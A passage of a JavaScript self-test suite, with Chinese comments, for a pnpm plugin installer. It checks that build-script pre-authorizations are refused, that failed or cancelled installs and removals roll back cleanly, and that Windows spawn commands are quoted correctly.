      );
    } finally {
      cleanup();
    }
  }

  // 1d-2. package.json can carry the same build authorization independently
  // of pnpm-workspace.yaml. Refuse every known positive form before spawning.
  {
    const policies = [
      { pnpm: { allowBuilds: { "evil-script-pkg": true } } },
      { pnpm: { onlyBuiltDependencies: ["evil-script-pkg"] } },
      { pnpm: { dangerouslyAllowAllBuilds: true } },
      { dependenciesMeta: { "evil-script-pkg": { built: true } } },
    ];
    let allRejected = true;
    const details = [];
    for (let index = 0; index < policies.length; index++) {
      const { profileDir, cleanup } = makeTempProfile(`manifest-preauth-${index}`);
      try {
        const manifest = { name: "p", dependencies: {}, ...policies[index] };
        writeFileSync(join(profileDir, "package.json"), JSON.stringify(manifest, undefined, 2) + "\n");
        const { spawnFn, calls } = scriptedSpawn([]);
        const outcome = await runInstall({
          profile: "p",
          spec: "some-plugin",
          preflight: preflightStub("some-plugin"),
          _profileDir: profileDir,
          _spawn: spawnFn,
        }).done;
        const rejected = outcome.status === "failed"
          && /pre-authorizes|would bypass/.test(outcome.detail ?? "")
          && calls.length === 0
          && !existsSync(pendingMarkerPath(profileDir));
        allRejected &&= rejected;
        if (!rejected) details.push(`${index}:${outcome.status}:${outcome.detail}:calls=${calls.length}`);
      } finally {
        cleanup();
      }
    }
    check("package.json 四种预授权策略均在 pnpm spawn 前 fail closed", allRejected, details.join(" | "));
  }

  // 1e. 无论是安装失败、重试失败还是成功，workspace 原始字节均完整还原（不破坏用户已有策略）
  {
    const { profileDir, cleanup } = makeTempProfile("ws-restore-on-failure");
    try {
      const userCustomWs = "packages:\n  - .\n\nallowBuilds:\n  user-custom-tool: true\n";
      writeFileSync(join(profileDir, "pnpm-workspace.yaml"), userCustomWs);
      materializeFakePackage(profileDir, "some-plugin", "1.0.0");
      materializeFakePackage(profileDir, "node-pty", "1.0.0", { install: "node install.js" });
      const approvedProof = computeMaterializedProof(profileDir, "some-plugin", [{ name: "node-pty", version: "1.0.0", selector: "node-pty@1.0.0" }]);

      // 重试执行失败
      const { spawnFn, calls } = scriptedSpawn([
        { code: 0, out: "Ignored build scripts: node-pty@1.0.0\n" },
        { code: 1, out: "Build error\n" },
      ]);
      const producer = runInstall({
        profile: "p",
        spec: "some-plugin",
        allowBuildScripts: ["node-pty"],
        approvedProof,
        preflight: preflightStub("some-plugin"),
        _profileDir: profileDir,
        _spawn: spawnFn,
        _describe: describeStub,
      });
      const outcome = await producer.done;
      const finalWs = readFileSync(join(profileDir, "pnpm-workspace.yaml"), "utf8");
      check(
        "重试执行失败 → workspace 依然完整恢复用户的 user-custom-tool 策略",
        outcome.status === "failed" && calls.length === 2 && finalWs === userCustomWs,
        `status=${outcome.status} calls=${calls.length} detail=${JSON.stringify(outcome.detail)} finalWs=${JSON.stringify(finalWs)}`,
      );
    } finally {
      cleanup();
    }
  }


  // 1f. Even when an approved rebuild itself succeeds, inability to put the
  // user's exact workspace bytes back is terminal and forces snapshot rollback.
  {
    const { profileDir, manifest, cleanup } = makeTempProfile("ws-restore-hard-fail");
    try {
      const initialWs = "packages:\n  - .\n\nnodeLinker: hoisted\n";
      writeFileSync(join(profileDir, "pnpm-workspace.yaml"), initialWs);
      materializeFakePackage(profileDir, "some-plugin", "1.0.0");
      materializeFakePackage(profileDir, "node-pty", "1.0.0", { install: "node install.js" });
      const approvedProof = computeMaterializedProof(profileDir, "some-plugin", [{ name: "node-pty", version: "1.0.0", selector: "node-pty@1.0.0" }]);
      const { spawnFn, calls } = scriptedSpawn([
        { code: 0, out: "Ignored build scripts: node-pty@1.0.0\n" },
        { code: 0, out: "Done\n" },
      ]);
      const outcome = await runInstall({
        profile: "p",
        spec: "some-plugin",
        allowBuildScripts: ["node-pty"],
        approvedProof,
        preflight: preflightStub("some-plugin"),
        _profileDir: profileDir,
        _spawn: spawnFn,
        _describe: describeStub,
        _restoreWorkspace: () => { throw new Error("simulated restore denial"); },
      }).done;
      check(
        "workspace 恢复写失败 → 即使 rebuild exit 0 也 terminal failed 并回滚 marker/profile",
        outcome.status === "failed"
          && /restor|恢复|workspace/i.test(outcome.detail ?? "")
          && calls.length === 2
          && readFileSync(join(profileDir, "package.json"), "utf8") === manifest
          && readFileSync(join(profileDir, "pnpm-workspace.yaml"), "utf8") === initialWs
          && !existsSync(pendingMarkerPath(profileDir)),
        `status=${outcome.status} detail=${JSON.stringify(outcome.detail)} calls=${calls.length}`,
      );
    } finally {
      cleanup();
    }
  }

  // 2. finalizeSuccess 抛错（pnpm 留下了坏 manifest）：归一成 failed、回滚
  // 恢复字节并收掉 marker、done 恰好结算一次且不拒绝。
  {
    const { profileDir, manifest, cleanup } = makeTempProfile("finalize-throws");
    try {
      materializeFakePackage(profileDir, "some-plugin", "1.0.0");
      const { spawnFn } = scriptedSpawn([{
        code: 0,
        out: "Done\n",
        beforeExit: () => writeFileSync(join(profileDir, "package.json"), "{ broken json"),
      }]);
      const producer = runInstall({ profile: "p", spec: "some-plugin", preflight: preflightStub("some-plugin"), _profileDir: profileDir, _spawn: spawnFn, _describe: describeStub });
      let settlements = 0;
      void producer.done.then(() => { settlements++; });
      const outcome = await producer.done;
      await flush();
      check(
        "finalize 抛错 → failed + 回滚恢复 package.json + marker 收掉 + 单次结算",
        outcome.status === "failed"
          && /reconciliation failed/.test(outcome.detail ?? "")
          && readFileSync(join(profileDir, "package.json"), "utf8") === manifest
          && !existsSync(pendingMarkerPath(profileDir))
          && settlements === 1,
        `status=${outcome.status} detail=${JSON.stringify(outcome.detail)} settlements=${settlements}`,
      );
    } finally {
      cleanup();
    }
  }

  // 3a. 串行化：install 在跑时 remove 排队，不许并发 spawn；install 失败回滚
  // 后 remove 才执行，且因目标不是依赖而 fail-fast（仍不 spawn）。
  {
    const { profileDir, cleanup } = makeTempProfile("serialize");
    try {
      materializeFakePackage(profileDir, "pkg-a", "1.0.0");
      const { spawnFn, procs } = blockingSpawn();
      const install = runInstall({ profile: "p", spec: "pkg-a", preflight: preflightStub("pkg-a"), _profileDir: profileDir, _spawn: spawnFn });
      await flush();
      const installSpawned = procs.length === 1;
      const remove = runRemove({ profile: "p", packageName: "pkg-a", _profileDir: profileDir, _spawn: spawnFn });
      await flush();
      const queuedNotSpawned = procs.length === 1;
      procs[0].finish(1, "boom");
      const installOutcome = await install.done;
      const removeOutcome = await remove.done;
      check(
        "install/remove 串行：remove 排队等待，install 结束后才执行",
        installSpawned
          && queuedNotSpawned
          && installOutcome.status === "failed"
          && removeOutcome.status === "failed"
          && /not a dependency/.test(removeOutcome.detail ?? "")
          // 普通失败不标记：重启治不好「这个包本来就不在依赖里」。
          && removeOutcome.staleOnRestart !== true
          && procs.length === 1,
        `procs=${procs.length} install=${installOutcome.status} remove=${removeOutcome.status} ${JSON.stringify(removeOutcome.detail)}`,
      );
    } finally {
      cleanup();
    }
  }

  // 3b-0. A corrupt/existing pending marker is recovery evidence. A new
  // install must neither overwrite it nor leave its just-created snapshot.
  {
    const { profileDir, cleanup } = makeTempProfile("install-corrupt-pending");
    try {
      const marker = pendingMarkerPath(profileDir);
      mkdirSync(dirname(marker), { recursive: true });
      const corruptBytes = "{ deliberately-corrupt\n";
      writeFileSync(marker, corruptBytes);
      const { spawnFn, calls } = scriptedSpawn([]);
      const outcome = await runInstall({
        profile: "p",
        spec: "some-plugin",
        preflight: preflightStub("some-plugin"),
        _profileDir: profileDir,
        _spawn: spawnFn,
      }).done;
      const snapshotsDir = join(dirname(marker), "snapshots");
      const leftoverSnapshots = existsSync(snapshotsDir) ? readdirSync(snapshotsDir) : [];
      check(
        // 不标 staleOnRestart：损坏的 marker 重启后仍然 fail-closed 留给人工
        // 检查，不会被启动恢复了结——这条失败的原因活得过重启，面板要留着。
        "损坏/既有 pending marker → install 不 spawn、不覆盖证据、不遗留新 snapshot，且不标记重启后失效",
        outcome.status === "failed"
          && /读不出来的安装记录/.test(outcome.detail ?? "")
          && outcome.staleOnRestart !== true
          && calls.length === 0
          && readFileSync(marker, "utf8") === corruptBytes
          && leftoverSnapshots.length === 0,
        `status=${outcome.status} calls=${calls.length} snapshots=${leftoverSnapshots.join(",")} detail=${JSON.stringify(outcome.detail)}`,
      );
    } finally {
      cleanup();
    }
  }

  // 3b. pending marker 存在时 remove 拒绝对该 profile 动手（fail closed），
  // marker 原样保留给恢复路径。
  {
    const { profileDir, cleanup } = makeTempProfile("pending-refuse", { "pkg-b": "1.0.0" });
    try {
      mkdirSync(dirname(pendingMarkerPath(profileDir)), { recursive: true });
      writeFileSync(pendingMarkerPath(profileDir), "{}\n");
      const { spawnFn, procs } = blockingSpawn();
      const outcome = await runRemove({ profile: "p", packageName: "pkg-b", _profileDir: profileDir, _spawn: spawnFn }).done;
      check(
        "pending marker 存在 → remove 拒绝执行且不 spawn pnpm，marker 保留",
        outcome.status === "failed"
          && /还没了结的安装事务/.test(outcome.detail ?? "")
          && outcome.staleOnRestart === true
          && procs.length === 0
          && existsSync(pendingMarkerPath(profileDir)),
        `status=${outcome.status} procs=${procs.length} ${JSON.stringify(outcome.detail)}`,
      );
    } finally {
      cleanup();
    }
  }

  // 3b-2. 卸载中途失败必须留下可恢复的状态 —— 这条钉的是一次真实故障。
  //
  // `pnpm remove` 删掉了 node_modules/<pkg>，随后写 pnpm-lock.yaml 时 EPERM
  // 失败并非零退出。当时 runRemove 没有任何事务保护，只是报了个 failed 就
  // 返回，于是 package.json 仍把该包声明为 bundle 层、目录却没了。dsh 从此
  // 拒绝启动：resolveBundleDir 在组装 profile 时抛错，那发生在任何插件加载
  // 之前，所以 apply() 里的启动恢复根本执行不到——何况当时也没有 marker 可
  // 供它接手。
  //
  // 现在的要求：中途失败之后，profile 要么被还原，要么留下 marker 让恢复路径
  // 接手。**绝不允许「既没还原、也没 marker」这第三种结局。**
  {
    const { profileDir, cleanup } = makeTempProfile("remove-midway-failure", { "pkg-c": "1.0.0" });
    try {
      materializeFakePackage(profileDir, "pkg-c", "1.0.0");
      const manifestBefore = readFileSync(join(profileDir, "package.json"), "utf8");
      const { spawnFn } = scriptedSpawn([{
        code: 1,
        out: "removing pkg-c\nEPERM: operation not permitted, rename '...pnpm-lock.yaml.tmp' -> 'pnpm-lock.yaml'\n",
        // pnpm 已经把目录删掉了才失败 —— 正是那次故障的形状。
        beforeExit: () => rmSync(join(profileDir, "node_modules", "pkg-c"), { recursive: true, force: true }),
      }]);
      const outcome = await runRemove({ profile: "p", packageName: "pkg-c", _profileDir: profileDir, _spawn: spawnFn }).done;
      const manifestAfter = readFileSync(join(profileDir, "package.json"), "utf8");
      const declaresPkg = JSON.parse(manifestAfter).dependencies?.["pkg-c"] !== undefined;
      const pkgOnDisk = existsSync(join(profileDir, "node_modules", "pkg-c"));
      const markerLeft = existsSync(pendingMarkerPath(profileDir));
      // 自洽 = 「声明了就得在盘上」。要么两者都在（已还原），要么 marker 还在
      // （交给恢复路径）。声明着却不在盘上、且没有 marker，就是那次砖化的形状。
      const consistent = declaresPkg === pkgOnDisk;
      check(
        "卸载中途失败（node_modules 已删）→ 要么还原、要么留 marker，绝不留下「声明了却不在盘上」且无人接手的 profile",
        outcome.status === "failed"
          && manifestAfter === manifestBefore
          && (consistent || markerLeft),
        `status=${outcome.status} declares=${declaresPkg} onDisk=${pkgOnDisk} marker=${markerLeft} detail=${JSON.stringify(outcome.detail)}`,
      );
    } finally {
      cleanup();
    }
  }

  // 3b-3. 早期失败（pnpm 还没动 node_modules）→ 干净回滚，marker 收掉，
  // profile 与卸载前逐字节一致。
  {
    const { profileDir, cleanup } = makeTempProfile("remove-early-failure", { "pkg-d": "1.0.0" });
    try {
      materializeFakePackage(profileDir, "pkg-d", "1.0.0");
      const manifestBefore = readFileSync(join(profileDir, "package.json"), "utf8");
      const { spawnFn } = scriptedSpawn([{ code: 1, out: "ERR_PNPM_NO_MATCHING_VERSION\n" }]);
      const outcome = await runRemove({ profile: "p", packageName: "pkg-d", _profileDir: profileDir, _spawn: spawnFn }).done;
      check(
        "卸载早期失败 → 回滚到卸载前字节、marker 收掉、包仍在盘上",
        outcome.status === "failed"
          && /restored to its pre-remove state/.test(outcome.detail ?? "")
          && readFileSync(join(profileDir, "package.json"), "utf8") === manifestBefore
          && existsSync(join(profileDir, "node_modules", "pkg-d"))
          && !existsSync(pendingMarkerPath(profileDir)),
        `status=${outcome.status} marker=${existsSync(pendingMarkerPath(profileDir))} detail=${JSON.stringify(outcome.detail)}`,
      );
    } finally {
      cleanup();
    }
  }

  // 3b-4. 退出码 0 不等于卸干净了：包还留在清单里就必须回滚，
  // 不能把一个半卸的 profile 当成功提交。
  {
    const { profileDir, cleanup } = makeTempProfile("remove-exit0-incomplete", { "pkg-e": "1.0.0" });
    try {
      materializeFakePackage(profileDir, "pkg-e", "1.0.0");
      // pnpm 声称成功，却没有改动清单（半完成）。
      const { spawnFn } = scriptedSpawn([{ code: 0, out: "Done\n" }]);
      const outcome = await runRemove({ profile: "p", packageName: "pkg-e", _profileDir: profileDir, _spawn: spawnFn }).done;
      check(
        "pnpm remove 退 0 但包仍在清单里 → 判为未完成并回滚，不提交",
        outcome.status === "failed"
          && /did not validate afterwards/.test(outcome.detail ?? ""),
        `status=${outcome.status} detail=${JSON.stringify(outcome.detail)}`,
      );
    } finally {
      cleanup();
    }
  }

  // 3b-5. 卸载成功 → marker 与 snapshot 都必须被提交清理干净。
  // 留下任何一个都会挡住这个 profile 后续所有安装和卸载，直到下次启动恢复。
  {
    const { profileDir, cleanup } = makeTempProfile("remove-success-cleanup", { "pkg-f": "1.0.0" });
    try {
      materializeFakePackage(profileDir, "pkg-f", "1.0.0");
      // 快照落在 <home>/guard/snapshots/（guard.js 的 snapshotRoot），不在
      // profile 目录里。第一版查的是 profileDir/.dsh-plugin-guard —— 那个路径
      // 根本不存在，于是「残留为空」恒成立，这半条断言等于没写。
      const snapshotDir = join(dirname(dirname(profileDir)), "guard", "snapshots");
      const listSnapshots = () => (existsSync(snapshotDir) ? readdirSync(snapshotDir) : []);
      // 只查「结束后为空」还不够：快照压根没被创建也会通过。在 pnpm 在途的
      // 那一刻取一次，先钉住它确实存在过，再钉住它被提交清理掉。
      let snapshotsWhileRunning = [];
      const { spawnFn } = scriptedSpawn([{
        code: 0,
        out: "Done\n",
        // pnpm 真正卸掉：清单与目录都拿走，落盘校验才会通过。
        beforeExit: () => {
          snapshotsWhileRunning = listSnapshots();
          const manifest = JSON.parse(readFileSync(join(profileDir, "package.json"), "utf8"));
          delete manifest.dependencies["pkg-f"];
          writeFileSync(join(profileDir, "package.json"), JSON.stringify(manifest, undefined, 2) + "\n");
          rmSync(join(profileDir, "node_modules", "pkg-f"), { recursive: true, force: true });
        },
      }]);
      const outcome = await runRemove({ profile: "p", packageName: "pkg-f", _profileDir: profileDir, _spawn: spawnFn }).done;
      const snapshotsLeft = listSnapshots();
      check(
        "卸载成功 → marker 与 snapshot 都被提交清理（且快照确实创建过）",
        outcome.status === "completed"
          && snapshotsWhileRunning.length === 1
          && !existsSync(pendingMarkerPath(profileDir))
          && snapshotsLeft.length === 0,
        `status=${outcome.status} 运行中快照=${snapshotsWhileRunning.join(",")} marker=${existsSync(pendingMarkerPath(profileDir))} 残留快照=${snapshotsLeft.join(",")} detail=${JSON.stringify(outcome.detail)}`,
      );
    } finally {
      cleanup();
    }
  }

  // 3b-6. 在途取消：必须等进程真正退出后才回滚，否则会与还在写盘的 pnpm 抢。
  // 安装路径早有这条，卸载路径此前没有。
  // 两种终止方言都跑，理由同 install 侧的 4b。
  for (const killAs of ["posix", "win32"]) {
    const { profileDir, cleanup } = makeTempProfile(`remove-cancel-inflight-${killAs}`, { "pkg-g": "1.0.0" });
    try {
      materializeFakePackage(profileDir, "pkg-g", "1.0.0");
      const { spawnFn, procs } = blockingSpawn(killAs);
      const producer = runRemove({ profile: "p", packageName: "pkg-g", _profileDir: profileDir, _spawn: spawnFn });
      await flush();
      // 与 install 的取消用例同规格：spawn 起来了、marker 已登记，取消之后
      // 结局是 killed 且 marker 被收掉。回滚接在 'close' 的 promise 之后，
      // 所以它必然晚于进程退出（FakeProc.kill 同步触发 close，时序无法在
      // 用例里再细分，由代码结构保证）。
      const spawnedAndMarked = procs.length === 1 && existsSync(pendingMarkerPath(profileDir));
      producer.cancel();
      const outcome = await producer.done;
      check(
        `取消在途 remove（${killAs} 终止方言）→ killed + 回滚收 marker，包仍在盘上`,
        spawnedAndMarked
          && outcome.status === "killed"
          && !existsSync(pendingMarkerPath(profileDir))
          && existsSync(join(profileDir, "node_modules", "pkg-g")),
        `spawnedAndMarked=${spawnedAndMarked} status=${outcome.status} marker=${existsSync(pendingMarkerPath(profileDir))} detail=${JSON.stringify(outcome.detail)}`,
      );
      check(
        `取消在途 remove（${killAs}）→ detail 不谎称 pnpm 失败`,
        !/exit code/.test(outcome.detail ?? ""),
        `detail=${outcome.detail}`,
      );
      check(
        `取消在途 remove（${killAs}）→ 回滚成功才说已还原`,
        /the profile was restored to its pre-remove state/.test(outcome.detail ?? ""),
        `detail=${outcome.detail}`,
      );
    } finally {
      cleanup();
    }
  }

  // 3b-6b. 卸载侧的同一格：取消了但没有还原目标。`{...rolled, status:"killed"}`
  // 曾经无条件把 rollbackRemove 判定的 failed 覆盖成 killed，等于把它三种
  // 结局里的两种失败结论抹平成一句「已取消」。
  {
    const { profileDir, cleanup } = makeTempProfile("remove-cancel-rollback-fails", { "pkg-g": "1.0.0" });
    try {
      materializeFakePackage(profileDir, "pkg-g", "1.0.0");
      const { spawnFn } = blockingSpawn("win32");
      const producer = runRemove({ profile: "p", packageName: "pkg-g", _profileDir: profileDir, _spawn: spawnFn });
      await flush();
      rmSync(pendingMarkerPath(profileDir), { force: true }); // 抽掉还原目标
      producer.cancel();
      const outcome = await producer.done;
      const detail = outcome.detail ?? "";
      check(
        "取消 + 回滚失败（remove）→ 退回 failed，不报 killed",
        outcome.status === "failed",
        `status=${outcome.status} detail=${detail}`,
      );
      check(
        "取消 + 回滚失败（remove）→ 绝不声称已还原",
        !/was restored/.test(detail),
        `detail=${detail}`,
      );
      check(
        "取消 + 回滚失败（remove）→ 指名 marker 与排查手段",
        /marker/.test(detail) && /guard validate|guard recover|before the next start/.test(detail),
        `detail=${detail}`,
      );
    } finally {
      cleanup();
    }
  }

  // 3b-7. spawn 同步抛错：marker 已经写下了，异常绝不能绕过收尾。
  // 安装侧后果更重——workspace 正停在被中和的状态，漏掉恢复就等于把用户的
  // allowBuilds 批准弄丢（启动恢复会 commit 掉快照，此后再也拿不回来）。
  {
    const throwingSpawn = () => { throw new TypeError("spawn EINVAL (synthetic)"); };
    {
      const { profileDir, cleanup } = makeTempProfile("remove-spawn-throw", { "pkg-h": "1.0.0" });
      try {
        materializeFakePackage(profileDir, "pkg-h", "1.0.0");
        const outcome = await runRemove({ profile: "p", packageName: "pkg-h", _profileDir: profileDir, _spawn: throwingSpawn }).done;
        check(
          "remove 的 spawn 同步抛错 → 走完收尾，不遗留 marker",
          outcome.status === "failed"
            && /could not start pnpm/.test(outcome.detail ?? "")
            && !existsSync(pendingMarkerPath(profileDir)),
          `status=${outcome.status} marker=${existsSync(pendingMarkerPath(profileDir))} detail=${JSON.stringify(outcome.detail)}`,
        );
      } finally {
        cleanup();
      }
    }
    {
      const { profileDir, cleanup } = makeTempProfile("install-spawn-throw", { "pkg-i": "1.0.0" });
      try {
        const initialWs = "packages:\n  - .\n\nallowBuilds:\n  native-pkg: true\n\nnodeLinker: hoisted\n";
        writeFileSync(join(profileDir, "pnpm-workspace.yaml"), initialWs);
        // 清单里声明的直系依赖必须都在盘上，否则回滚的完整性校验会失败并
        // 保留 marker——那是另一条正确行为，会盖住这条要测的东西。
        materializeFakePackage(profileDir, "pkg-i", "1.0.0");
        materializeFakePackage(profileDir, "native-pkg", "1.0.0", { install: "node build.js" });
        const outcome = await runInstall({
          profile: "p",
          spec: "some-plugin",
          preflight: preflightStub("some-plugin"),
          _profileDir: profileDir,
          _spawn: throwingSpawn,
          _describe: describeStub,
        }).done;
        check(
          "install 的 spawn 同步抛错 → 恢复 workspace 原字节且不遗留 marker（否则用户的 allowBuilds 会被永久中和）",
          outcome.status === "failed"
            && readFileSync(join(profileDir, "pnpm-workspace.yaml"), "utf8") === initialWs
            && !existsSync(pendingMarkerPath(profileDir)),
          `status=${outcome.status} marker=${existsSync(pendingMarkerPath(profileDir))} ws=${JSON.stringify(readFileSync(join(profileDir, "pnpm-workspace.yaml"), "utf8"))}`,
        );
      } finally {
        cleanup();
      }
    }
  }

  // 3c. 排队中被取消：killed 结局，pnpm 从未启动；锁随后正常释放。
  {
    const { profileDir, cleanup } = makeTempProfile("cancel-queued");
    try {
      materializeFakePackage(profileDir, "pkg-a", "1.0.0");
      const { spawnFn, procs } = blockingSpawn();
      const install = runInstall({ profile: "p", spec: "pkg-a", preflight: preflightStub("pkg-a"), _profileDir: profileDir, _spawn: spawnFn });
      await flush();
      const remove = runRemove({ profile: "p", packageName: "pkg-a", _profileDir: profileDir, _spawn: spawnFn });
      remove.cancel();
      procs[0]?.finish(1, "boom");
      const installOutcome = await install.done;
      const removeOutcome = await remove.done;
      check(
        "排队中取消 → killed，未 spawn；前一个任务照常完成",
        removeOutcome.status === "killed" && procs.length === 1 && installOutcome.status === "failed",
        `remove=${removeOutcome.status} install=${installOutcome.status} procs=${procs.length}`,
      );
    } finally {
      cleanup();
    }
  }

  // 4a. spawn 计划（纯函数）：非 Windows 无 shell；Windows 有 .exe 则
  // shell:false，仅 .cmd 则 shell:true + treeKill 且 command 自带引号
  // （.cmd 常在 `D:\Program Files\nodejs` 这类带空格的目录里，shell:true 下
  // Node 只拼空格不逐参数引用，不引用就从空格截断），全找不到回退 "pnpm"。
  {
    const shimDir = mkdtempSync(join(tmpdir(), "dsh-mall-selftest-path-"));
    try {
      const planPosix = pnpmSpawnPlan({ platform: "linux", pathEnv: shimDir });
      const posixOk = planPosix.command === "pnpm" && planPosix.shell === false && planPosix.treeKill === false;
      const planMissing = pnpmSpawnPlan({ platform: "win32", pathEnv: shimDir });
      const missingOk = planMissing.command === "pnpm" && planMissing.shell === true && planMissing.treeKill === true;
      writeFileSync(join(shimDir, "pnpm.cmd"), "@echo off\r\n");
      const planCmd = pnpmSpawnPlan({ platform: "win32", pathEnv: shimDir });
      const cmdOk = planCmd.command === `"${join(shimDir, "pnpm.cmd")}"` && planCmd.shell === true && planCmd.treeKill === true;
      writeFileSync(join(shimDir, "pnpm.exe"), "MZ");
      const planExe = pnpmSpawnPlan({ platform: "win32", pathEnv: shimDir });
      const exeOk = planExe.command === join(shimDir, "pnpm.exe") && planExe.shell === false && planExe.treeKill === false;
      check(
        "pnpmSpawnPlan：posix 直起 / win32 优先 .exe 无 shell / 仅 .cmd 则带引号 + treeKill",
        posixOk && missingOk && cmdOk && exeOk,
        JSON.stringify({ planPosix, planMissing, planCmd, planExe }),
      );
      // 空格目录不是假想敌：Node 默认装进 Program Files，真实机器上命令从
      // 空格截断曾让「'D:\Program' 不是内部或外部命令」拦下所有预检。
      const spaceDir = join(shimDir, "dir with space");
      mkdirSync(spaceDir, { recursive: true });
      writeFileSync(join(spaceDir, "pnpm.cmd"), "@echo probe-ok\r\n");
      const planSpace = pnpmSpawnPlan({ platform: "win32", pathEnv: spaceDir });
      check(
        "pnpmSpawnPlan：带空格的 .cmd 路径 → command 自带引号",
        planSpace.shell === true && planSpace.command === `"${join(spaceDir, "pnpm.cmd")}"`,
        JSON.stringify(planSpace),
      );
      // 引用必须真的可跑：Windows 真机端到端 spawn 一轮假 shim（CI 是 Linux，
      // 只跑静态断言；Windows 上这一条覆盖完整链路）。
      if (process.platform === "win32") {
        const probe = spawnSync(planSpace.command, ["--version"], { shell: planSpace.shell, encoding: "utf8", timeout: 15000 });
        check(
          "pnpmSpawnPlan：带引号 command 真实 spawn 不再被空格截断",
          probe.status === 0 && /probe-ok/.test(probe.stdout ?? ""),
          `status=${probe.status} stdout=${JSON.stringify((probe.stdout ?? "").slice(0, 80))} stderr=${JSON.stringify((probe.stderr ?? "").slice(0, 80))}`,
        );
      }
    } finally {
      rmSync(shimDir, { recursive: true, force: true });
    }
  }

  // 4b. 取消时序：cancel() → 进程 close → killed 结局 → 回滚收 marker，
  // 回滚严格发生在进程退出之后（done 链只在 'close' 后推进）。
  //
  // 两种平台方言都要跑。只跑 posix 的时候这条一直是绿的，而真实 Windows 上
  // 用户按 job_kill 收到的是 `failed (exit code 1)`——taskkill /T /F 是终止
  // 不是发信号，Node 报 close(1, null)，`exitCode === null` 判据落空。fixture
  // 照着代码的假设写，就只能验证代码符合自己的假设。
  for (const killAs of ["posix", "win32"]) {
    const { profileDir, cleanup } = makeTempProfile(`cancel-order-${killAs}`);
    try {
      materializeFakePackage(profileDir, "pkg-a", "1.0.0");
      const { spawnFn, procs } = blockingSpawn(killAs);
      const install = runInstall({ profile: "p", spec: "pkg-a", preflight: preflightStub("pkg-a"), _profileDir: profileDir, _spawn: spawnFn });
      await flush();
      const spawnedAndMarked = procs.length === 1 && existsSync(pendingMarkerPath(profileDir));
      install.cancel();
      const outcome = await install.done;
      const output = (() => { let text = ""; let chunk = install.readOutput(); while (chunk.length > 0) { text += chunk; chunk = install.readOutput(); } return text; })();
      check(
        `取消在途 install（${killAs} 终止方言）→ killed + 回滚收 marker（在进程退出之后）`,
        spawnedAndMarked
          && outcome.status === "killed"
          && !existsSync(pendingMarkerPath(profileDir))
          && /restored profile files/.test(output),
        `status=${outcome.status} detail=${outcome.detail} marker=${existsSync(pendingMarkerPath(profileDir))}`,
      );
      // 取消的结局不许把 pnpm 的退出码当成失败原因报出去——模型读到
      // "failed (exit code 1)" 会去排查一个根本不存在的安装故障。
      check(
        `取消在途 install（${killAs}）→ detail 不谎称 pnpm 失败`,
        !/exit code/.test(outcome.detail ?? ""),
        `detail=${outcome.detail}`,
      );
      check(
        `取消在途 install（${killAs}）→ 回滚成功才说已还原`,
        /the profile was restored to its pre-install state/.test(outcome.detail ?? ""),
        `detail=${outcome.detail}`,
      );
    } finally {
      cleanup();
    }
  }

  // 4c. 装后终检（issue #14）：预检的探装禁了 lifecycle 脚本，带安装期脚本
  // 的候选入口要等构建后才可能出现——预检对它们只 warn，这里是硬闸。
  // pnpm 成功、入口在真树里仍缺 → failed + 回滚（绝不提交一块砖）；
  // 构建产出了入口 → completed。beforeExit 模拟 pnpm add 的落盘效果
  // （node_modules 实体化 + manifest 依赖写入）。
  {
    const fatalPatch = `
- insert:
    - id: mcp-x
      name: '@deepseek-ai/dsh-mcp-client'
      config:
        transport: stdio
        command: node
        args:
          - !!js dshHomePath('profiles/p/node_modules/mcp-brick-pkg/dist/mcp/index.js')
        failOnStartupError: true
`;
    const materializeCandidate = (profileDir, withEntry) => {
      const dir = join(profileDir, "node_modules", "mcp-brick-pkg");
      mkdirSync(dir, { recursive: true });
      if (withEntry) {
        mkdirSync(join(dir, "dist", "mcp"), { recursive: true });
        writeFileSync(join(dir, "dist", "mcp", "index.js"), "");
      }
      writeFileSync(join(dir, "package.json"), JSON.stringify({ name: "mcp-brick-pkg", version: "1.0.0", scripts: { postinstall: "node build.js" }, dsh: { bundle: { patch: "./cordis.patch.yml" } } }));
      writeFileSync(join(dir, "cordis.patch.yml"), fatalPatch);
      const manifest = JSON.parse(readFileSync(join(profileDir, "package.json"), "utf8"));
      manifest.dependencies = { ...(manifest.dependencies ?? {}), "mcp-brick-pkg": "1.0.0" };
      writeFileSync(join(profileDir, "package.json"), JSON.stringify(manifest, undefined, 2) + "\n");
    };
    const runAuditInstall = (profileDir, withEntry) => {
      const spawn = scriptedSpawn([{ code: 0, out: "Done in 1s\n", beforeExit: () => materializeCandidate(profileDir, withEntry) }]);
      return runInstall({ profile: "p", spec: "mcp-brick-pkg", preflight: preflightStub("mcp-brick-pkg"), _profileDir: profileDir, _spawn: spawn.spawnFn, _describe: async () => [] }).done;
    };

    {
      const { profileDir, cleanup } = makeTempProfile("audit-missing");
      try {
        const outcome = await runAuditInstall(profileDir, false);
        const depGone = JSON.parse(readFileSync(join(profileDir, "package.json"), "utf8")).dependencies?.["mcp-brick-pkg"] === undefined;
        check(
          "装后终检：入口仍缺 → failed 且回滚（不提交砖）",
          outcome.status === "failed" && /入口/.test(outcome.detail ?? "") && depGone && !existsSync(pendingMarkerPath(profileDir)),
          `status=${outcome.status} detail=${(outcome.detail ?? "").slice(0, 120)}`,
        );
      } finally {
        cleanup();
      }
    }
    {
      const { profileDir, cleanup } = makeTempProfile("audit-present");
      try {
        const outcome = await runAuditInstall(profileDir, true);
        check("装后终检：构建产出了入口 → completed", outcome.status === "completed", `status=${outcome.status} detail=${(outcome.detail ?? "").slice(0, 120)}`);
      } finally {
        cleanup();
      }
    }

    // 终检失败 + 回滚做不成（marker 被外部抽掉）：detail 绝不能同时出现
    // 「已回滚」和「无法回滚」——终检文案只说失败，恢复结论由外层三态拼。
    {
      const { profileDir, cleanup } = makeTempProfile("audit-rollback-fails");
      try {
        const spawn = scriptedSpawn([{
          code: 0,
          out: "Done in 1s\n",
          beforeExit: () => {
            materializeCandidate(profileDir, false);
            rmSync(pendingMarkerPath(profileDir), { force: true }); // 抽掉还原目标
          },
        }]);
        const outcome = await runInstall({ profile: "p", spec: "mcp-brick-pkg", preflight: preflightStub("mcp-brick-pkg"), _profileDir: profileDir, _spawn: spawn.spawnFn, _describe: async () => [] }).done;
        const detail = outcome.detail ?? "";
        check(
          "终检失败 + 回滚失败 → 不预言恢复，failed 且指名 marker",
          outcome.status === "failed"
            && /仍缺失/.test(detail)
            && /could NOT be restored|marker/.test(detail)
            && !/has been rolled back/.test(detail),
          `status=${outcome.status} detail=${detail.slice(0, 160)}`,
        );
      } finally {
        cleanup();
      }
    }
  }

